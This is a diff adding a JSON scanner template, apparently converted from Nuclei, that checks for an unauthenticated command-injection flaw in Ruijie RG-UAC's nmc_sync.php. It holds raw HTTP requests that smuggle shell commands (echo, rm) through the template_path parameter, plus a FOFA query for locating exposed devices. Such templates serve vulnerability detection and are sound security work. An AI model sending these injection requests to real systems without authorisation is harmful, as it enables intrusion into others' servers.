@@ -1,0 +1,135 @@
+{
+  "id": "ruijie-nmc-sync-rce",
+  "name": "Ruijie RG-UAC nmc_sync.php - Remote Code Execution",
+  "author": "DhiyaneshDk",
+  "severity": "CRITICAL",
+  "description": "There is a command execution vulnerability in the nmc_sync.php interface of Ruijie\u0027s RG-UAC unified online behavior management and audit system. An unauthenticated attacker can execute arbitrary commands to control server permissions.\n",
+  "references": [
+    "https://github.com/xinyisleep/pocscan/blob/main/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7_EG%E6%98%93%E7%BD%91%E5%85%B3_%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E5%89%8D%E5%8F%B0RCE.py"
+  ],
+  "tags": [
+    "rg-uac",
+    "file-upload",
+    "intrusive",
+    "ruijie"
+  ],
+  "protocol": "http",
+  "selfContained": false,
+  "searchQueries": {
+    "fofa": "title\u003d\"RG-UAC登录页面\" \u0026\u0026 body\u003d\"admin\""
+  },
+  "variables": {
+    "match_str": [
+      "{{md5(random_str)}}"
+    ],
+    "random_str": [
+      "{{rand_base(6)}}"
+    ]
+  },
+  "variablesType": "sniper",
+  "verifySteps": [
+    {
+      "stepId": "http_0",
+      "headers": {},
+      "followRedirect": false,
+      "timeout": 0,
+      "readSize": 0,
+      "raw": [
+        "GET /view/systemConfig/management/nmc_sync.php?center_ip\u003d127.0.0.1\u0026template_path\u003d|echo+{{match_str}}+\u003e+{{random_str}}.txt|cat HTTP/1.1\nHost: {{Hostname}}\n",
+        "GET /view/systemConfig/management/{{random_str}}.txt HTTP/1.1\nHost: {{Hostname}}\n",
+        "GET /view/systemConfig/management/nmc_sync.php?center_ip\u003d127.0.0.1\u0026template_path\u003d|rm+{{random_str}}.txt|cat HTTP/1.1\nHost: {{Hostname}}\n"
+      ],
+      "unsafe": false,
+      "disableCookie": false,
+      "disablePathAutomerge": false,
+      "cache": false,
+      "compressed": false,
+      "chunked": false,
+      "matchers": [
+        {
+          "type": "DSL",
+          "values": [
+            "status_code_1 \u003d\u003d 200 \u0026\u0026 status_code_2 \u003d\u003d 200",
+            "contains(body_2, \u0027{{match_str}}\u0027)"
+          ],
+          "negative": false,
+          "condition": "AND",
+          "index": 0,
+          "caseInsensitive": false,
+          "greedy": false,
+          "group": 0
+        }
+      ],
+      "matchersCondition": "OR",
+      "extractors": [],
+      "output": {},
+      "retries": 0,
+      "retryInterval": 0
+    }
+  ],
+  "exploitSteps": [],
+  "globalConfig": {
+    "maxRetries": 0,
+    "retryInterval": 0,
+    "globalHeaders": {},
+    "stopAtFirstMatch": false,
+    "threads": 0,
+    "cookieReuse": false,
+    "dnsConfig": {},
+    "authConfig": {}
+  },
+  "originalPoc": {
+    "id": "ruijie-nmc-sync-rce",
+    "info": {
+      "name": "Ruijie RG-UAC nmc_sync.php - Remote Code Execution",
+      "author": "DhiyaneshDk",
+      "severity": "critical",
+      "description": "There is a command execution vulnerability in the nmc_sync.php interface of Ruijie\u0027s RG-UAC unified online behavior management and audit system. An unauthenticated attacker can execute arbitrary commands to control server permissions.\n",
+      "reference": [
+        "https://github.com/xinyisleep/pocscan/blob/main/%E9%94%90%E6%8D%B7/%E9%94%90%E6%8D%B7_EG%E6%98%93%E7%BD%91%E5%85%B3_%E4%B8%8A%E7%BD%91%E8%A1%8C%E4%B8%BA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F_%E5%89%8D%E5%8F%B0RCE.py"
+      ],
+      "classification": {},
+      "metadata": {
+        "max_request": 3,
+        "fofa_query": "title\u003d\"RG-UAC登录页面\" \u0026\u0026 body\u003d\"admin\""
+      },
+      "tags": "rg-uac,file-upload,intrusive,ruijie"
+    },
+    "variables": {
+      "random_str": "{{rand_base(6)}}",
+      "match_str": "{{md5(random_str)}}"
+    },
+    "self_contained": false,
+    "http": [
+      {
+        "global_matchers": false,
+        "cookie_reuse": false,
+        "disable_cookie": false,
+        "disable_path_automerge": false,
+        "threads": 0,
+        "redirects": false,
+        "skip_variables_check": false,
+        "stop_at_first_match": false,
+        "unsafe": false,
+        "read_all": false,
+        "iterate_all": false,
+        "raw": [
+          "GET /view/systemConfig/management/nmc_sync.php?center_ip\u003d127.0.0.1\u0026template_path\u003d|echo+{{match_str}}+\u003e+{{random_str}}.txt|cat HTTP/1.1\nHost: {{Hostname}}\n",
+          "GET /view/systemConfig/management/{{random_str}}.txt HTTP/1.1\nHost: {{Hostname}}\n",
+          "GET /view/systemConfig/management/nmc_sync.php?center_ip\u003d127.0.0.1\u0026template_path\u003d|rm+{{random_str}}.txt|cat HTTP/1.1\nHost: {{Hostname}}\n"
+        ],
+        "matchers": [
+          {
+            "type": "dsl",
+            "dsl": [
+              "status_code_1 \u003d\u003d 200 \u0026\u0026 status_code_2 \u003d\u003d 200",
+              "contains(body_2, \u0027{{match_str}}\u0027)"
+            ],
+            "condition": "and"
+          }
+        ]
+      }
+    ]
+  },
+  "originalFormat": "nuclei"
+}
